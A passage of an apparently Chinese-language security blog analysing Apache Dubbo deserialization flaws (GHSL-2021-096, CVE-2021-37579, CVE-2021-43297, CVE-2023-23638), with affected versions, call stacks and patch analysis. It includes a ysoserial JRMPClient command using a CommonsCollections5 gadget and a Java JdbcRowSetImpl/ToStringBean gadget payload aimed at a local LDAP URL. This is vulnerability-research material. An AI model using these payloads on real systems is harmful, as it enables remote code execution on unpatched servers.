反序列化黑白名单</p><ul><li>dubbo.application.hessian2.whitelist</li><li>dubbo.application.hessian2.allow</li><li>dubbo.application.hessian2.deny</li></ul><p>在启动参数-D上指定对应的值，但是default并没有，因此还是受影响的（在2.7.13上测试）。</p><blockquote><p>直到2.7.14版本修复CVE-2021-43297 在com.alibaba.com.caucho.hessian.io.ClassFactory引入DENY_CLASS 才算解决。</p></blockquote><h2 id="0x13-GHSL-2021-096"><a href="#0x13-GHSL-2021-096" class="headerlink" title="0x13 GHSL-2021-096"></a>0x13 GHSL-2021-096</h2><h3 id="13-1-影响版本"><a href="#13-1-影响版本" class="headerlink" title="13.1 影响版本"></a>13.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDK&lt;JEP290</span><br></pre></td></tr></table></figure><h3 id="13-2-漏洞分析"><a href="#13-2-漏洞分析" class="headerlink" title="13.2 漏洞分析"></a>13.2 漏洞分析</h3><h4 id="13-2-1-Dubbo-RMI协议"><a href="#13-2-1-Dubbo-RMI协议" class="headerlink" title="13.2.1 Dubbo RMI协议"></a>13.2.1 Dubbo RMI协议</h4><p>Dubbo 支持rmi协议，参考<a href="https://cn.dubbo.apache.org/en/docs/v2.7/user/references/protocol/rmi/">rmi protocol</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:protocol name&#x3D;&quot;rmi&quot; port&#x3D;&quot;1099&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>RMI 角色</p><ul><li>register 注册中心： 启动1099端口的服务，也即dubbo 的provider</li><li>server: dubbo 的provider</li><li>client: dubbo 的consumer</li></ul><p>那么consumer攻击provider == rmi client 攻击register/server</p><p>温习下以前的RMI 攻击手法</p><ul><li><a href="/2020/06/30/RMI%EF%BC%9Aclient-registry-server%E7%9A%84%E4%BA%92%E7%9B%B8%E6%94%BB%E5%87%BB/#5-%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF">RMI：client-registry-server的互相攻击</a> </li><li><a href="/2020/07/02/RMI%EF%BC%9A%E7%BB%95%E8%BF%87JEP290%E2%80%94%E2%80%94%E4%B8%8A/">RMI：绕过JEP290——上</a></li></ul><h4 id="13-2-2-Client-攻击Register"><a href="#13-2-2-Client-攻击Register" class="headerlink" title="13.2.2 Client 攻击Register"></a>13.2.2 Client 攻击Register</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections5 <span class="string">&quot;open -a calculator.app&quot;</span></span><br></pre></td></tr></table></figure><ul><li>受JEP290 的影响</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">toString:132, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">readObject:86, BadAttributeValueExpException (javax.management)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">dispatch:-1, DGCImpl_Skel (sun.rmi.transport)</span><br><span class="line">oldDispatch:410, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:268, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:568, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:790, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 23408403 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$161)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h4 id="13-2-3-Client-攻击Server"><a href="#13-2-3-Client-攻击Server" class="headerlink" title="13.2.3 Client 攻击Server"></a>13.2.3 Client 攻击Server</h4><blockquote><p>RMI服务端会对RMI客户端传递过来的参数进行反序列化</p></blockquote><ul><li>这里需要方法能装Object参数，比如Objct/Map等</li><li>原生的反序列化，这里不受JEP 290影响</li></ul><p>Dubbo刚好RMI 在生成服务的时候，暴露了两个：原始的方法和generic方法，这两个都方法第三个参数都是Object</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readObject:334, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readArray:1707, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1345, ObjectInputStream (java.io)</span><br><span class="line">readArray:1707, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1345, ObjectInputStream (java.io)</span><br><span class="line">defaultReadFields:2000, ObjectInputStream (java.io)</span><br><span class="line">readSerialData:1924, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:326, UnicastRef (sun.rmi.server)</span><br><span class="line">dispatch:308, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:568, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:826, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$256:683, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 23408403 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$161)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:682, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="13-3-补丁分析"><a href="#13-3-补丁分析" class="headerlink" title="13.3 补丁分析"></a>13.3 补丁分析</h3><p>这个漏洞未分配CVE，官方回复是交由用户开启JEP290修复</p><h2 id="0x14-CVE-2021-37579"><a href="#0x14-CVE-2021-37579" class="headerlink" title="0x14 CVE-2021-37579"></a>0x14 CVE-2021-37579</h2><h3 id="14-1-影响版本"><a href="#14-1-影响版本" class="headerlink" title="14.1 影响版本"></a>14.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.0&lt;&#x3D;Dubbo&lt;&#x3D;3.0.1</span><br><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.12</span><br></pre></td></tr></table></figure><h3 id="14-2-漏洞分析"><a href="#14-2-漏洞分析" class="headerlink" title="14.2 漏洞分析"></a>14.2 漏洞分析</h3><p>这个漏洞就是安全策略checkSerialization 的Bypass</p><h4 id="14-2-1-安全策略checkSerialization"><a href="#14-2-1-安全策略checkSerialization" class="headerlink" title="14.2.1 安全策略checkSerialization"></a>14.2.1 安全策略checkSerialization</h4><p>功能：是判断Dubbo数据包指定的序列化方式是否和配置相同，在2.6.10.1中引入，但是默认不开启</p><blockquote><p>这个安全策略是为了解决哪个CVE的呢？漏洞CVE-2021-25641 是针对反序列化，但是不是当时的补丁</p></blockquote><ol><li>Dubbo数据包制定的序列化方式在header[2]，eg</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (isResponse) &#123;</span><br><span class="line">    header[<span class="number">2</span>] = (<span class="keyword">byte</span>) <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-517.png" alt="upload successful"></p><ol start="2"><li>配置的序列化方式，默认为hessian2</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dubbo:protocol name&#x3D;&quot;dubbo&quot; port&#x3D;&quot;20880&quot; serialization&#x3D;&quot;fastjson&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h5><p><img src="/images/pasted-516.png" alt="upload successful"></p><p>通过不存在的版本，进入logger.warn 判断逻辑，绕过下面的</p><h4 id="14-2-2-漏洞"><a href="#14-2-2-漏洞" class="headerlink" title="14.2.2 漏洞"></a>14.2.2 漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">exec:620, Runtime (java.lang)</span><br><span class="line">exec:450, Runtime (java.lang)</span><br><span class="line">exec:347, Runtime (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">transform:126, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:123, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">put:611, HashMap (java.util)</span><br><span class="line">readObject:334, HashSet (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:1017, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:1900, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:1801, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1351, ObjectInputStream (java.io)</span><br><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">readObject:75, JavaObjectInput (org.apache.dubbo.common.serialize.java)</span><br><span class="line">readObject:82, JavaObjectInput (org.apache.dubbo.common.serialize.java)</span><br><span class="line">decode:155, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">received:44, DecodeHandler (org.apache.dubbo.remoting.transport)</span><br><span class="line">run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="14-3-补丁分析"><a href="#14-3-补丁分析" class="headerlink" title="14.3 补丁分析"></a>14.3 补丁分析</h3><p><a href="https://github.com/apache/dubbo/commit/ca794b627cd7ce9634ce215d39bc757d49e5810f">https://github.com/apache/dubbo/commit/ca794b627cd7ce9634ce215d39bc757d49e5810f</a></p><p><img src="/images/pasted-518.png" alt="upload successful"></p><p>直接抛异常</p><h2 id="0x15-CVE-2021-43297"><a href="#0x15-CVE-2021-43297" class="headerlink" title="0x15 CVE-2021-43297"></a>0x15 CVE-2021-43297</h2><h3 id="15-1-影响版本"><a href="#15-1-影响版本" class="headerlink" title="15.1 影响版本"></a>15.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hessian-lite&lt;&#x3D;3.2.11</span><br><span class="line">3.0.0&lt;&#x3D;Dubbo&lt;&#x3D;3.0.5</span><br><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.15</span><br><span class="line">2.6.0&lt;&#x3D;Dubbo&lt;&#x3D;2.6.12</span><br></pre></td></tr></table></figure><h3 id="15-2-漏洞分析"><a href="#15-2-漏洞分析" class="headerlink" title="15.2 漏洞分析"></a>15.2 漏洞分析</h3><blockquote><p>A deserialization vulnerability existed in dubbo hessian-lite 3.2.11 and its earlier versions, which could lead to malicious code execution. Most Dubbo users use Hessian2 as the default serialization/deserialization protocol, during Hessian catch unexpected exceptions, Hessian will log out some imformation for users, which may cause remote command execution. This issue affects Apache Dubbo Apache Dubbo 2.6.x versions prior to 2.6.12; Apache Dubbo 2.7.x versions prior to 2.7.15; Apache Dubbo 3.0.x versions prior to 3.0.5.</p></blockquote><p>从描述可以看出是hessian-lite 的问题，具体看看补丁</p><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd#">https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd#</a></p><p><img src="/images/pasted-491.png" alt="upload successful"></p><p><img src="/images/pasted-492.png" alt="upload successful"></p><p>可以看出，字符串隐式加，会调用obj 的toString 方法</p><p>有好几个sink修改点，Longo师傅筛选后用的是Hessian2Input，这里刚好readObject 之后马上toString</p><p><img src="/images/pasted-493.png" alt="upload successful"></p><p>所以可以精简payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">payload</span><span class="params">()</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    JdbcRowSetImpl rs = <span class="keyword">new</span> JdbcRowSetImpl();</span><br><span class="line">    rs.setDataSourceName(<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>);</span><br><span class="line">    rs.setMatchColumn(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    Reflections.getField(javax.sql.rowset.BaseRowSet.class, <span class="string">&quot;listeners&quot;</span>).set(rs, <span class="keyword">null</span>);</span><br><span class="line">    ToStringBean item = <span class="keyword">new</span> ToStringBean(JdbcRowSetImpl.class, rs);</span><br><span class="line">    <span class="keyword">return</span> item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-494.png" alt="upload successful"></p><p>调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">toString:158, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">toString:129, ToStringBean (com.rometools.rome.feed.impl)</span><br><span class="line">valueOf:2994, String (java.lang)</span><br><span class="line">append:131, StringBuilder (java.lang)</span><br><span class="line">expect:3522, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readString:1853, Hessian2Input (com.alibaba.com.caucho.hessian.io)</span><br><span class="line">readUTF:79, Hessian2ObjectInput (com.alibaba.dubbo.common.serialize.hessian2)</span><br><span class="line">decode:97, DecodeableRpcInvocation (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:70, DecodeableRpcInvocation (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decodeBody:128, DubboCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:125, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:85, ExchangeCodec (com.alibaba.dubbo.remoting.exchange.codec)</span><br><span class="line">decode:46, DubboCountCodec (com.alibaba.dubbo.rpc.protocol.dubbo)</span><br><span class="line">decode:95, NettyCodecAdapter$InternalDecoder (com.alibaba.dubbo.remoting.transport.netty4)</span><br><span class="line">decodeRemovalReentryProtection:489, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">callDecode:428, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">channelRead:265, ByteToMessageDecoder (io.netty.handler.codec)</span><br><span class="line">invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:340, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">channelRead:1359, DefaultChannelPipeline$HeadContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:362, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">invokeChannelRead:348, AbstractChannelHandlerContext (io.netty.channel)</span><br><span class="line">fireChannelRead:935, DefaultChannelPipeline (io.netty.channel)</span><br><span class="line">read:134, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)</span><br><span class="line">processSelectedKey:645, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeysOptimized:580, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">processSelectedKeys:497, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:459, NioEventLoop (io.netty.channel.nio)</span><br><span class="line">run:858, SingleThreadEventExecutor$5 (io.netty.util.concurrent)</span><br><span class="line">run:138, DefaultThreadFactory$DefaultRunnableDecorator (io.netty.util.concurrent)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><h3 id="15-3-补丁分析"><a href="#15-3-补丁分析" class="headerlink" title="15.3 补丁分析"></a>15.3 补丁分析</h3><p><a href="https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd#">https://github.com/apache/dubbo-hessian-lite/commit/a35a4e59ebc76721d936df3c01e1943e871729bd#</a></p><ol><li><p>去掉obj 的toString 隐式调用。<br> <img src="/images/pasted-501.png" alt="upload successful"></p></li><li><p>2.7.14版本在com.alibaba.com.caucho.hessian.io.ClassFactory中添加了黑名单，通过包命和类名过滤将要创建的对象，而Hessian2反序列化创建对象时，都需要使用ClassFactory这个工厂类。</p></li></ol><h4 id="15-3-1-安全策略-DENY-CLASS"><a href="#15-3-1-安全策略-DENY-CLASS" class="headerlink" title="15.3.1 安全策略 DENY_CLASS"></a>15.3.1 安全策略 DENY_CLASS</h4><blockquote><p>2.7.14版本在com.alibaba.com.caucho.hessian.io.ClassFactory中添加了黑名单，通过包命和类名过滤将要创建的对象，而Hessian2反序列化创建对象时，都需要使用ClassFactory这个工厂类。</p></blockquote><p><img src="/images/pasted-500.png" alt="upload successful"></p><h3 id="15-4-其他"><a href="#15-4-其他" class="headerlink" title="15.4 其他"></a>15.4 其他</h3><ol><li><p>漏洞影响并不小，虽然是dubbo-hessian-lite 这个仓库的问题，但是这个仓库一直是dubbo 项目内置的</p></li><li><p>bitterz 师傅后续还有分析，一直到&lt;=2.7.13都可用</p></li><li><p>和GHSL-2021-036 原理一样，早在GHSL-2021-036 pwntester就提出了这类链路</p></li><li><p>疑问：除了下面的调用链，还有没有其他的？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hessian2ObjectInput#readUTF</span><br><span class="line">  Hessian2Input#readString</span><br><span class="line">  Hessian2Input#expect</span><br></pre></td></tr></table></figure></li></ol><p>// TODO<br>AbstractDeserializer</p><ul><li>除非找到子类，并且没有重写readObject/readMap 方法，还要找到剩下的调用链<br>JavaDeserializer</li><li>可能也有利用链</li></ul><h2 id="0x16-CVE-2023-23638"><a href="#0x16-CVE-2023-23638" class="headerlink" title="0x16 CVE-2023-23638"></a>0x16 CVE-2023-23638</h2><h3 id="16-1-影响版本"><a href="#16-1-影响版本" class="headerlink" title="16.1 影响版本"></a>16.1 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2.7.0&lt;&#x3D;Dubbo&lt;&#x3D;2.7.21</span><br><span class="line">3.0.0&lt;&#x3D;Dubbo&lt;&#x3D;3.0.13</span><br><span class="line">3.1.0&lt;&#x3D;Dubbo&lt;&#x3D;3.1.5</span><br></pre></td></tr></table></figure><h3 id="16-2-补丁分析"><a href="#16-2-补丁分析" class="headerlink" title="16.2 补丁分析"></a>16.2 补丁分析</h3><h4 id="2-7-版本"><a href="#2-7-版本" class="headerlink" title="2.7 版本"></a>2.7 版本</h4><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.21...dubbo-2.7.22">https://github.com/apache/dubbo/compare/dubbo-2.7.21…dubbo-2.7.22</a></p><ol><li>CVE-2021-30179 raw.return/javabean 的补丁加强，对Class.forName 之后的类在过了一遍黑名单，那么这次的patch是CVE-2021-30179的绕过吗？<ul><li>JavaBeanSerializeUtil#name2class</li><li>PojoUtils@relize0<br><img src="/images/pasted-454.png" alt="upload successful"></li></ul></li><li>修补了hessian 反序列化的Serializable 特性<ul><li>SerializeClassChecker#validateClass<blockquote><p>su18: 并不是只有Serializable 的Class才能序列化，如果_isAllowNonSerializable=True也可以，Serializable限制是在序列化的时候做的，因此会导致绕过问题</p></blockquote></li></ul></li></ol><p><img src="/images/pasted-495.png" alt="upload successful"></p><p>针对这两处patch，那么漏洞可能是</p><ol><li>Class.forName 的绕过，或者SerializeClassChecker#validateClass的绕过？</li><li>Serializable 名单绕过，可能存在特殊类，不是黑名单，但是是非Serializable</li></ol><h4 id="3-1-版本"><a href="#3-1-版本" class="headerlink" title="3.1 版本"></a>3.1 版本</h4><p>3.1.5-&gt;3.1.6 的patch<br><a href="https://github.com/apache/dubbo/commit/c44873e9b2e2a9ecb0459dce6e85cdfc829b2300">https://github.com/apache/dubbo/commit/c44873e9b2e2a9ecb0459dce6e85cdfc829b2300</a></p><p><img src="/images/pasted-524.png" alt="upload successful"></p><h3 id="16-3-漏洞分析"><a href="#16-3-漏洞分析" class="headerlink" title="16.3 漏洞分析"></a>16.3 